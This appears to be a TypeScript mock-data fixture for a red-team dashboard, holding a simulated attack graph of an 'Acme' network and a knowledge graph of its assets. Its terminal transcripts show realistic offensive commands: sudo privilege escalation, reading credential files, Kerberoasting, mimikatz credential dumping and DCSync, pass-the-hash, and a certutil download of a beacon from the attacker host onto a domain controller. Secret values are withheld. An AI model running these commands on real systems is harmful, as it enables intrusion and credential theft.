// Shared graph fixtures (mock data only) backing the AttackGraph and
// KnowledgeGraph screens. Rendered read-only with explicit MOCK labels.
//
// Hygiene properties (P7.5):
// - Nodes, edges and terminal transcripts are illustrative sample data —
//   relationships are mocked observations, NOT confirmed attack paths from
//   a live engagement.
// - Credential material appears as metadata only: secret values (passwords,
//   keys, ticket material, hashes) are deliberately withheld from transcripts
//   and detail panels. Withholding is enforced here, at the fixture level.
// - Graph screens expose no C2 actions; terminal panels are recorded
//   observations.

export const GRAPH_FIXTURE_PROJECT_ID = '1'

export const ATTACK_GRAPH_SOURCE_NOTE =
  'Sample graph fixture (mocks/fixtures/graphs.ts) for the demo Acme project. ' +
  'Nodes, edges and terminal panels are illustrative mock observations — not ' +
  'confirmed attack paths from a live engagement.'

export const KNOWLEDGE_GRAPH_SOURCE_NOTE =
  'Sample graph fixture (mocks/fixtures/graphs.ts) for the demo Acme project. ' +
  'Relationships are illustrative mock observations — not confirmed attack ' +
  'paths or topology facts from a live engagement.'

// ─── Attack Graph ───────────────────────────────────────────────────────────

export type AttackGraphNodeState = 'unknown' | 'discovered' | 'compromised' | 'objective'
export type AttackGraphNodeType = 'host' | 'user' | 'service' | 'domain'

export interface AttackGraphNode {
  id: string
  label: string
  type: AttackGraphNodeType
  state: AttackGraphNodeState
  x: number
  y: number
  ip?: string
  os?: string
  user?: string
  privilege?: string
  session?: string
  agent?: string
  task?: string
  ports?: string
  terminalTabs?: string[]
  terminalOutputs?: string[][]
}

export interface AttackGraphEdge {
  from: string
  to: string
  edgeState: 'active' | 'discovered' | 'targeting' | 'unknown'
}

export const ATTACK_GRAPH_NODES: AttackGraphNode[] = [
  {
    id: 'attacker',
    label: 'ATTACKER',
    type: 'host',
    state: 'compromised',
    x: 72,
    y: 250,
    ip: '198.51.100.77',
    os: 'Kali Linux 2024.3',
    user: 'root',
    privilege: 'root',
    session: 'C2-LOCAL',
    agent: 'Agent-Alpha',
    task: 'Managing 4 active sessions',
    terminalTabs: ['C2 Console', 'Listeners'],
    terminalOutputs: [
      [
        '\x1b[32m[*]\x1b[0m Sliver C2 console v1.5.42',
        '\x1b[32m[*]\x1b[0m Active sessions: 4',
        '',
        'sliver > sessions',
        '',
        ' ID   Name        Transport  Remote               Hostname    Username',
        '====  ==========  =========  ===================  ==========  ========',
        '\x1b[32m[1]\x1b[0m  WEB-01      mtls       203.0.113.45:4444    web-01      www-data',
        '\x1b[32m[2]\x1b[0m  DEV-WS-01   mtls       10.10.1.15:4444      dev-ws-01   jdavis',
        '\x1b[32m[3]\x1b[0m  FILE-SRV    mtls       10.10.1.22:4444      file-srv    SYSTEM',
        '\x1b[32m[4]\x1b[0m  WKSTN-02    mtls       10.10.2.10:4444      wkstn-02    akennedy',
        '',
        'sliver >',
      ],
      [
        '\x1b[32m[*]\x1b[0m Active listeners',
        '',
        ' ID   Protocol  Port  Status',
        '====  ========  ====  =======',
        '[1]   mtls      4444  \x1b[32mACTIVE\x1b[0m',
        '[2]   http      8080  \x1b[32mACTIVE\x1b[0m',
        '',
        'sliver >',
      ],
    ],
  },
  {
    id: 'fw01',
    label: 'FW-01',
    type: 'service',
    state: 'discovered',
    x: 215,
    y: 250,
    ip: '203.0.113.1',
    os: 'FortiOS 7.4',
    ports: 'HTTPS/443, SSH/22',
    agent: 'Agent-Alpha',
    task: 'Port scanning perimeter',
    terminalTabs: ['Recon'],
    terminalOutputs: [
      [
        '$ nmap -sV -p- --min-rate 5000 203.0.113.1',
        'Starting Nmap 7.94',
        '',
        'PORT    STATE  SERVICE  VERSION',
        '22/tcp  open   ssh      OpenSSH 8.9',
        '443/tcp open   https    FortiOS HTTPS',
        '',
        '\x1b[33m[!]\x1b[0m FortiOS 7.4 — CVE-2024-21762 may apply',
        '$ ',
      ],
    ],
  },
  {
    id: 'web01',
    label: 'WEB-01',
    type: 'host',
    state: 'compromised',
    x: 370,
    y: 140,
    ip: '203.0.113.45',
    os: 'Ubuntu 22.04 LTS',
    user: 'www-data → root',
    privilege: 'root',
    session: 'mtls-session-1',
    agent: 'Agent-Alpha',
    task: 'Reviewing /etc/shadow',
    ports: 'HTTP/80, HTTPS/443, SSH/22',
    terminalTabs: ['Shell', 'Privesc'],
    terminalOutputs: [
      [
        'www-data@web-01:/var/www/html$ cat .env',
        'DB_HOST=10.10.1.30',
        'DB_USER=app_user',
        'DB_PASS=\x1b[32m[value withheld]\x1b[0m',
        'API_KEY=\x1b[32m[value withheld]\x1b[0m',
        '',
        'www-data@web-01:/var/www/html$ ls /home',
        'jdavis  backup',
        '',
        'www-data@web-01:/var/www/html$ find / -name "*.key" 2>/dev/null',
        '/home/jdavis/.ssh/id_rsa',
        '/etc/ssl/private/web.key',
      ],
      [
        'www-data@web-01:~$ sudo -l',
        'User www-data may run:',
        '    (root) NOPASSWD: /usr/bin/python3',
        '',
        '$ sudo python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
        '\x1b[32mroot@web-01:/var/www/html#\x1b[0m id',
        'uid=0(root) gid=0(root) groups=0(root)',
        '',
        '\x1b[32m[+]\x1b[0m Root via sudo misconfiguration',
      ],
    ],
  },
  {
    id: 'vpngw',
    label: 'VPN-GW',
    type: 'service',
    state: 'discovered',
    x: 370,
    y: 360,
    ip: '203.0.113.60',
    os: 'Cisco AnyConnect',
    ports: 'HTTPS/443, UDP/4443',
    agent: 'Agent-Beta',
    task: 'Credential spray in progress',
    terminalTabs: ['Spray'],
    terminalOutputs: [
      [
        '$ ./spray.py --target https://vpn.acme.com --userList users.txt',
        '\x1b[33m[*]\x1b[0m Testing 247 accounts (candidate list withheld)',
        '\x1b[31m[-]\x1b[0m admin — FAIL',
        '\x1b[31m[-]\x1b[0m jdavis — FAIL',
        '\x1b[32m[+]\x1b[0m mkumar — SUCCESS (value withheld)',
        '',
        '\x1b[32m[+]\x1b[0m Valid credential found: mkumar — value withheld',
        '$ ',
      ],
    ],
  },
  {
    id: 'devws',
    label: 'DEV-WS-01',
    type: 'host',
    state: 'compromised',
    x: 535,
    y: 110,
    ip: '10.10.1.15',
    os: 'Ubuntu 20.04 LTS',
    user: 'jdavis',
    privilege: 'sudo',
    session: 'mtls-session-2',
    agent: 'Agent-Alpha',
    task: 'Enumerating internal network',
    ports: 'SSH/22',
    terminalTabs: ['Shell', 'Network Enum'],
    terminalOutputs: [
      [
        '\x1b[32mjdavis@dev-ws-01\x1b[0m:~$ cat ~/.aws/credentials',
        '[default]',
        'aws_access_key_id = [value withheld]',
        'aws_secret_access_key = [value withheld]',
        '',
        '\x1b[32mjdavis@dev-ws-01\x1b[0m:~$ cat ~/.ssh/known_hosts',
        '10.10.1.22  ecdsa-sha2-nistp256 AAAA...',
        '10.10.2.10  ecdsa-sha2-nistp256 AAAA...',
      ],
      [
        '\x1b[32mjdavis@dev-ws-01\x1b[0m:~$ nmap -sn 10.10.1.0/24',
        '\x1b[32mHost 10.10.1.22\x1b[0m  — file-srv.acme.local',
        'Host 10.10.1.30  — db-prod.acme.local',
        '\x1b[32mHost 10.10.2.10\x1b[0m  — wkstn-02.acme.local',
        '',
        '\x1b[32m[+]\x1b[0m Potential lateral move to FILE-SRV via SSH key',
      ],
    ],
  },
  {
    id: 'filesrv',
    label: 'FILE-SRV',
    type: 'host',
    state: 'compromised',
    x: 535,
    y: 260,
    ip: '10.10.1.22',
    os: 'Windows Server 2019',
    user: 'SYSTEM',
    privilege: 'SYSTEM',
    session: 'mtls-session-3',
    agent: 'Agent-Alpha',
    task: 'Kerberoasting — 3 tickets captured',
    ports: 'SMB/445, RDP/3389',
    terminalTabs: ['Shell', 'Kerberoast', 'Mimikatz'],
    terminalOutputs: [
      [
        'C:\\> whoami',
        'nt authority\\system',
        '',
        'C:\\> net share',
        'Finance      C:\\Finance    Finance docs',
        'HR_Data      C:\\HR_Data    HR records',
        '',
        'C:\\> net user /domain | head',
        'Administrator  akennedy  jdavis  svc-sql  svc-backup',
      ],
      [
        'C:\\> Invoke-Kerberoast -OutputFormat Hashcat',
        '',
        '\x1b[32m[+]\x1b[0m SPN: MSSQLSvc/sql-main.acme.local:1433',
        '    $krb5tgs$23$*** (contents withheld)',
        '\x1b[32m[+]\x1b[0m SPN: CIFS/backup-srv.acme.local',
        '    $krb5tgs$23$*** (contents withheld)',
        '',
        '\x1b[32m[+]\x1b[0m 3 tickets captured — sending to hashcat',
      ],
      [
        'mimikatz # sekurlsa::logonpasswords',
        '',
        'Authentication Id : 0 ; 123456',
        '    UserName : akennedy',
        '    Domain   : ACME',
        '    NTLM     : \x1b[32m[value withheld]\x1b[0m',
        '    Password : \x1b[32m[value withheld]\x1b[0m',
      ],
    ],
  },
  {
    id: 'dbprod',
    label: 'DB-PROD',
    type: 'host',
    state: 'discovered',
    x: 535,
    y: 400,
    ip: '10.10.1.30',
    os: 'Windows Server 2022',
    ports: 'MSSQL/1433, RDP/3389',
    agent: 'Agent-Beta',
    task: 'Attempting credential reuse',
    terminalTabs: ['Recon'],
    terminalOutputs: [
      [
        '$ crackmapexec mssql 10.10.1.30 -u app_user -p "[value withheld]"',
        '\x1b[32mMSSQL\x1b[0m 10.10.1.30 1433 DB-PROD [*] Windows 10.0 Build 20348',
        '\x1b[32mMSSQL\x1b[0m 10.10.1.30 1433 DB-PROD \x1b[32m[+]\x1b[0m Access confirmed',
        '',
        '\x1b[32m[+]\x1b[0m xp_cmdshell enabled. Staging implant...',
      ],
    ],
  },
  {
    id: 'wkstn02',
    label: 'WKSTN-02',
    type: 'host',
    state: 'compromised',
    x: 700,
    y: 170,
    ip: '10.10.2.10',
    os: 'Windows 11 Enterprise',
    user: 'akennedy',
    privilege: 'Local Admin',
    session: 'mtls-session-4',
    agent: 'Agent-Alpha',
    task: 'Pass-the-hash attempt against DC-01',
    ports: 'SMB/445, WinRM/5985',
    terminalTabs: ['Shell', 'PTH Attack'],
    terminalOutputs: [
      [
        'C:\\> whoami /groups',
        'ACME\\IT-Admins',
        'BUILTIN\\Administrators',
        '',
        'C:\\> net group "Domain Admins" /domain',
        'Administrator  akennedy  svc-backup',
      ],
      [
        'C:\\> crackmapexec smb dc-01.acme.local \\',
        '      -u akennedy -H [value withheld]',
        '',
        '\x1b[32mSMB\x1b[0m 10.10.0.5 445 DC-01 [*] Windows Server 2019',
        '\x1b[32mSMB\x1b[0m 10.10.0.5 445 DC-01 \x1b[32m[+]\x1b[0m ACME\\akennedy (access confirmed)',
        '',
        '\x1b[32m[+]\x1b[0m Domain Admin access confirmed on DC-01!',
      ],
    ],
  },
  {
    id: 'svcacct',
    label: 'SVC-ACCT',
    type: 'user',
    state: 'compromised',
    x: 700,
    y: 335,
    user: 'svc-backup@ACME.LOCAL',
    privilege: 'Domain Admin (delegation)',
    session: 'Kerberos TGT',
    agent: 'Agent-Alpha',
    task: 'DCSync operation in progress',
    terminalTabs: ['DCSync'],
    terminalOutputs: [
      [
        'mimikatz # lsadump::dcsync /domain:ACME.LOCAL /user:krbtgt',
        '',
        '\x1b[32m[DC]\x1b[0m Exporting domain ACME.LOCAL from dc-01',
        '',
        'Object RDN           : krbtgt',
        'SAM Username         : krbtgt',
        'NT Hash              : \x1b[32m[value withheld]\x1b[0m',
        '',
        '\x1b[32m[+]\x1b[0m krbtgthash obtained — Golden Ticket feasible',
      ],
    ],
  },
  {
    id: 'dc01',
    label: 'DC-01',
    type: 'domain',
    state: 'objective',
    x: 845,
    y: 220,
    ip: '10.10.0.5',
    os: 'Windows Server 2019',
    user: 'PENDING',
    privilege: 'Domain Admin (target)',
    agent: 'Agent-Alpha',
    task: 'Staging implant via PTH',
    ports: 'DNS/53, LDAP/389, Kerberos/88, SMB/445',
    terminalTabs: ['Status'],
    terminalOutputs: [
      [
        '\x1b[33m[!]\x1b[0m DC-01 is the primary objective',
        '\x1b[33m[!]\x1b[0m Domain: ACME.LOCAL',
        '\x1b[33m[!]\x1b[0m Reachable from: WKSTN-02, ADMIN-WS',
        '',
        '\x1b[32m[*]\x1b[0m Staging implant via Pass-the-Hash...',
        '\x1b[32m[*]\x1b[0m ETA: ~30 seconds',
        '',
        'Post-compromise plan:',
        '  — Dump NTDS.dit',
        '  — Extract all domain hashes',
        '  — Create Golden Ticket persistence',
      ],
    ],
  },
  {
    id: 'adminws',
    label: 'ADMIN-WS',
    type: 'host',
    state: 'compromised',
    x: 845,
    y: 370,
    ip: '10.10.2.50',
    os: 'Windows 10 Enterprise',
    user: 'Administrator',
    privilege: 'Domain Admin',
    session: 'Pass-the-Hash',
    agent: 'Agent-Beta',
    task: 'Lateral movement staging',
    ports: 'SMB/445, RDP/3389',
    terminalTabs: ['Shell'],
    terminalOutputs: [
      [
        'C:\\> whoami',
        'acme\\administrator',
        '',
        'C:\\> wmic /node:dc-01.acme.local process call create \\',
        '  "cmd.exe /c certutil -urlcache -split -f \\',
        '   http://198.51.100.77:8080/beacon.exe C:\\Windows\\Temp\\svc.exe"',
        '',
        '\x1b[32m[+]\x1b[0m Process created on DC-01',
      ],
    ],
  },
  {
    id: 'sqlmain',
    label: 'SQL-MAIN',
    type: 'host',
    state: 'unknown',
    x: 930,
    y: 295,
    ip: '10.10.1.50',
    os: 'Windows Server 2022',
    ports: 'MSSQL/1433',
    agent: 'Agent-Beta',
    task: 'Not yet targeted',
    terminalTabs: ['Notes'],
    terminalOutputs: [
      [
        '\x1b[33m[*]\x1b[0m SQL-MAIN found via Kerberoast SPN',
        '\x1b[33m[*]\x1b[0m SPN: MSSQLSvc/sql-main.acme.local:1433',
        '\x1b[33m[*]\x1b[0m Ticket captured — cracking in progress',
        '',
        '$ hashcat -m 13100 ticket.hash rockyou.txt',
        '\x1b[33m[*]\x1b[0m Status: Running... (ETA: ~2 min)',
      ],
    ],
  },
]

export const ATTACK_GRAPH_EDGES: AttackGraphEdge[] = [
  { from: 'attacker', to: 'fw01', edgeState: 'active' },
  { from: 'fw01', to: 'web01', edgeState: 'active' },
  { from: 'fw01', to: 'vpngw', edgeState: 'discovered' },
  { from: 'web01', to: 'devws', edgeState: 'active' },
  { from: 'web01', to: 'filesrv', edgeState: 'active' },
  { from: 'vpngw', to: 'filesrv', edgeState: 'discovered' },
  { from: 'vpngw', to: 'dbprod', edgeState: 'discovered' },
  { from: 'devws', to: 'wkstn02', edgeState: 'active' },
  { from: 'filesrv', to: 'svcacct', edgeState: 'active' },
  { from: 'wkstn02', to: 'dc01', edgeState: 'targeting' },
  { from: 'svcacct', to: 'adminws', edgeState: 'active' },
  { from: 'adminws', to: 'dc01', edgeState: 'targeting' },
  { from: 'dc01', to: 'sqlmain', edgeState: 'unknown' },
]

export const ATTACK_GRAPH_ZONES = [
  { label: 'External', x: 0, w: 132 },
  { label: 'Perimeter', x: 132, w: 158 },
  { label: 'DMZ', x: 290, w: 162 },
  { label: 'Internal', x: 452, w: 168 },
  { label: 'Domain', x: 620, w: 190 },
  { label: 'Objective', x: 810, w: 166 },
]

// ─── Knowledge Graph ─────────────────────────────────────────────────────────

export type KnowledgeGraphNodeCategory = 'Asset' | 'Identity' | 'Service' | 'Domain' | 'Network'

export interface KnowledgeGraphNode {
  id: string
  label: string
  sublabel?: string
  category: KnowledgeGraphNodeCategory
  x: number
  y: number
  ring: 'center' | 'inner' | 'outer'
  relationships: number
  findings: number
  lastUpdated: string
  details: Record<string, string>
  tags?: string[]
}

export interface KnowledgeGraphEdge {
  from: string
  to: string
  relation: string
}

const KGW = 980
const KGH = 520
const KG_CX = 490
const KG_CY = 265
const KG_INNER_R = 150
const KG_OUTER_R = 205

export const KNOWLEDGE_GRAPH_GEOMETRY = {
  width: KGW,
  height: KGH,
  centerX: KG_CX,
  centerY: KG_CY,
  innerRadius: KG_INNER_R,
  outerRadius: KG_OUTER_R,
}

function kgPolar(cx: number, cy: number, r: number, angleDeg: number) {
  const rad = (angleDeg - 90) * (Math.PI / 180)
  return { x: cx + r * Math.cos(rad), y: cy + r * Math.sin(rad) }
}

const KG_CENTER = { x: KG_CX, y: KG_CY }

// Inner ring — 6 nodes at 60° intervals
const KgIn0 = kgPolar(KG_CX, KG_CY, KG_INNER_R, 0)
const KgIn1 = kgPolar(KG_CX, KG_CY, KG_INNER_R, 60)
const KgIn2 = kgPolar(KG_CX, KG_CY, KG_INNER_R, 120)
const KgIn3 = kgPolar(KG_CX, KG_CY, KG_INNER_R, 180)
const KgIn4 = kgPolar(KG_CX, KG_CY, KG_INNER_R, 240)
const KgIn5 = kgPolar(KG_CX, KG_CY, KG_INNER_R, 300)

// Outer ring — 8 nodes at 45° intervals
const KgOut0 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 0)
const KgOut1 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 45)
const KgOut2 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 90)
const KgOut3 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 135)
const KgOut4 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 180)
const KgOut5 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 225)
const KgOut6 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 270)
const KgOut7 = kgPolar(KG_CX, KG_CY, KG_OUTER_R, 315)

export const KNOWLEDGE_GRAPH_NODES: KnowledgeGraphNode[] = [
  // Center
  {
    id: 'acme-com',
    label: 'acme.com',
    sublabel: 'Root Domain',
    category: 'Domain',
    x: KG_CENTER.x, y: KG_CENTER.y,
    ring: 'center',
    relationships: 12,
    findings: 0,
    lastUpdated: '2026-09-28 14:30',
    details: { 'Registrar': 'GoDaddy', 'Nameservers': 'ns1.acme.com, ns2.acme.com', 'DNSSEC': 'Enabled', 'TLD': '.com' },
    tags: ['primary', 'in-scope'],
  },
  // Inner ring
  {
    id: 'web-acme',
    label: 'web.acme.com',
    sublabel: 'HTTP/443',
    category: 'Asset',
    x: KgIn0.x, y: KgIn0.y,
    ring: 'inner',
    relationships: 4,
    findings: 1,
    lastUpdated: '2026-09-28 13:55',
    details: { 'IP': '203.0.113.45', 'Server': 'nginx 1.25.3', 'TLS': 'TLS 1.3', 'CMS': 'WordPress 6.4' },
    tags: ['web', 'wordpress'],
  },
  {
    id: 'api-acme',
    label: 'api.acme.com',
    sublabel: 'REST API',
    category: 'Asset',
    x: KgIn1.x, y: KgIn1.y,
    ring: 'inner',
    relationships: 6,
    findings: 3,
    lastUpdated: '2026-09-28 13:22',
    details: { 'IP': '203.0.113.46', 'Framework': 'Express 4.18', 'Auth': 'JWT + OAuth2', 'Docs': '/api/swagger' },
    tags: ['api', 'auth', 'high-value'],
  },
  {
    id: 'vpn-acme',
    label: 'vpn.acme.com',
    sublabel: 'Cisco AnyConnect',
    category: 'Service',
    x: KgIn2.x, y: KgIn2.y,
    ring: 'inner',
    relationships: 3,
    findings: 1,
    lastUpdated: '2026-09-28 14:10',
    details: { 'IP': '203.0.113.60', 'Product': 'Cisco AnyConnect', 'Version': '4.10.07061', 'Auth': 'RADIUS + MFA' },
    tags: ['vpn', 'remote-access'],
  },
  {
    id: 'mail-acme',
    label: 'mail.acme.com',
    sublabel: 'SMTP/IMAP',
    category: 'Service',
    x: KgIn3.x, y: KgIn3.y,
    ring: 'inner',
    relationships: 2,
    findings: 0,
    lastUpdated: '2026-09-28 13:08',
    details: { 'IP': '203.0.113.70', 'MTA': 'Postfix 3.7', 'SPF': 'Pass', 'DMARC': 'Enforced' },
    tags: ['mail', 'email'],
  },
  {
    id: 'dev-acme',
    label: 'dev.acme.com',
    sublabel: 'Dev Environment',
    category: 'Asset',
    x: KgIn4.x, y: KgIn4.y,
    ring: 'inner',
    relationships: 3,
    findings: 1,
    lastUpdated: '2026-09-28 13:10',
    details: { 'IP': '10.10.1.15', 'Server': 'Apache 2.4', 'Access': 'Internal only', 'Env': 'Development' },
    tags: ['dev', 'internal'],
  },
  {
    id: 'cdn-acme',
    label: 'cdn.acme.com',
    sublabel: 'Cloudflare CDN',
    category: 'Asset',
    x: KgIn5.x, y: KgIn5.y,
    ring: 'inner',
    relationships: 2,
    findings: 0,
    lastUpdated: '2026-09-28 13:00',
    details: { 'Provider': 'Cloudflare', 'Caching': 'Global CDN', 'WAF': 'Active', 'Origin': 'web.acme.com' },
    tags: ['cdn', 'cloudflare'],
  },
  // Outer ring
  {
    id: 'admin-staging',
    label: 'admin.acme-staging.io',
    sublabel: 'Admin Panel',
    category: 'Asset',
    x: KgOut0.x, y: KgOut0.y,
    ring: 'outer',
    relationships: 2,
    findings: 2,
    lastUpdated: '2026-09-28 14:28',
    details: { 'IP': '203.0.113.80', 'Auth': 'Basic Auth (weak)', 'Exposure': 'Public', 'CMS': 'Custom PHP' },
    tags: ['admin', 'staging', 'critical'],
  },
  {
    id: 'ip-45',
    label: '203.0.113.45',
    sublabel: 'Web Server IP',
    category: 'Network',
    x: KgOut1.x, y: KgOut1.y,
    ring: 'outer',
    relationships: 3,
    findings: 0,
    lastUpdated: '2026-09-28 14:15',
    details: { 'ASN': 'AS64496 (Acme Hosting)', 'PTR': 'web-01.acme.com', 'Country': 'US', 'Open Ports': '22, 80, 443' },
    tags: ['ip', 'server'],
  },
  {
    id: 'user-jdavis',
    label: 'jdavis',
    sublabel: 'James Davis · IT Admin',
    category: 'Identity',
    x: KgOut2.x, y: KgOut2.y,
    ring: 'outer',
    relationships: 4,
    findings: 0,
    lastUpdated: '2026-09-28 14:00',
    details: { 'Email': 'j.davis@acme.com', 'Role': 'IT Administrator', 'Auth': 'SSO + MFA', 'Access': 'Domain Admin' },
    tags: ['admin', 'privileged'],
  },
  {
    id: 'user-mkumar',
    label: 'mkumar',
    sublabel: 'Mohit Kumar · DevOps',
    category: 'Identity',
    x: KgOut3.x, y: KgOut3.y,
    ring: 'outer',
    relationships: 3,
    findings: 1,
    lastUpdated: '2026-09-28 13:45',
    details: { 'Email': 'm.kumar@acme.com', 'Role': 'DevOps Engineer', 'Auth': 'Password only', 'Cred Status': 'Captured (value withheld)' },
    tags: ['devops', 'credential-found'],
  },
  {
    id: 'ip-internal',
    label: '10.10.1.22',
    sublabel: 'FILE-SRV (Internal)',
    category: 'Network',
    x: KgOut4.x, y: KgOut4.y,
    ring: 'outer',
    relationships: 3,
    findings: 0,
    lastUpdated: '2026-09-28 14:15',
    details: { 'Subnet': '10.10.1.0/24', 'PTR': 'file-srv.acme.local', 'OS': 'Windows Server 2019', 'Open Ports': '445, 3389' },
    tags: ['internal', 'windows'],
  },
  {
    id: 'svc-postgres',
    label: 'PostgreSQL',
    sublabel: 'DB Service · 5432',
    category: 'Service',
    x: KgOut5.x, y: KgOut5.y,
    ring: 'outer',
    relationships: 2,
    findings: 0,
    lastUpdated: '2026-09-28 13:50',
    details: { 'Host': '10.10.1.30', 'Version': 'PostgreSQL 15.4', 'Auth': 'md5', 'Databases': 'app_db, analytics' },
    tags: ['database', 'postgres'],
  },
  {
    id: 'svc-nginx',
    label: 'nginx:443',
    sublabel: 'Reverse Proxy',
    category: 'Service',
    x: KgOut6.x, y: KgOut6.y,
    ring: 'outer',
    relationships: 3,
    findings: 0,
    lastUpdated: '2026-09-28 13:55',
    details: { 'Version': 'nginx/1.25.3', 'Config': '/etc/nginx/sites-enabled/', 'TLS': 'Let\'s Encrypt', 'Upstream': 'localhost:3000' },
    tags: ['nginx', 'proxy'],
  },
  {
    id: 'corp-ad',
    label: 'ACME.LOCAL',
    sublabel: 'Active Directory',
    category: 'Domain',
    x: KgOut7.x, y: KgOut7.y,
    ring: 'outer',
    relationships: 5,
    findings: 0,
    lastUpdated: '2026-09-28 14:30',
    details: { 'DC': 'dc-01.acme.local', 'Forest': 'ACME.LOCAL', 'Trust': 'None', 'Users': '247 accounts' },
    tags: ['active-directory', 'domain'],
  },
]

export const KNOWLEDGE_GRAPH_EDGES: KnowledgeGraphEdge[] = [
  // Center to inner
  { from: 'acme-com', to: 'web-acme', relation: 'HOSTS' },
  { from: 'acme-com', to: 'api-acme', relation: 'HOSTS' },
  { from: 'acme-com', to: 'vpn-acme', relation: 'RUNS' },
  { from: 'acme-com', to: 'mail-acme', relation: 'RUNS' },
  { from: 'acme-com', to: 'dev-acme', relation: 'LINKS_TO' },
  { from: 'acme-com', to: 'cdn-acme', relation: 'HOSTS' },
  // Inner to outer
  { from: 'web-acme', to: 'admin-staging', relation: 'LINKS_TO' },
  { from: 'web-acme', to: 'ip-45', relation: 'RESOLVES_TO' },
  { from: 'api-acme', to: 'user-jdavis', relation: 'ADMIN_OF' },
  { from: 'api-acme', to: 'svc-postgres', relation: 'USES' },
  { from: 'vpn-acme', to: 'user-mkumar', relation: 'BELONGS_TO' },
  { from: 'vpn-acme', to: 'ip-internal', relation: 'ROUTES_TO' },
  { from: 'dev-acme', to: 'user-jdavis', relation: 'ADMIN_OF' },
  { from: 'dev-acme', to: 'svc-nginx', relation: 'RUNS' },
  { from: 'cdn-acme', to: 'svc-nginx', relation: 'PROXIES' },
  { from: 'mail-acme', to: 'user-mkumar', relation: 'BELONGS_TO' },
  // Outer cross-links
  { from: 'ip-45', to: 'corp-ad', relation: 'BELONGS_TO' },
  { from: 'user-jdavis', to: 'corp-ad', relation: 'MEMBER_OF' },
  { from: 'ip-internal', to: 'corp-ad', relation: 'BELONGS_TO' },
]
